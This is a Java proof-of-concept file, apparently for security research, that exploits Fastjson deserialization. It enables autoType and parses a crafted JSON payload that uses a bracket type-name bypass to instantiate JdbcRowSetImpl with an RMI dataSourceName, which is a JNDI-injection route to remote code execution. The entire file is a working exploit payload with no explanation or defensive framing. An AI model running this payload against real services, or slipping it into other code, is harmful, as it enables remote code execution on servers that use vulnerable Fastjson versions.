package com.test.example2;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * Use JDK 7u21
 */
public class Poc4 {
    public static void main(String[] argv) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{," +
                "\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\"," +
                " \"autoCommit\":true}";
        JSON.parse(payload);
    }
}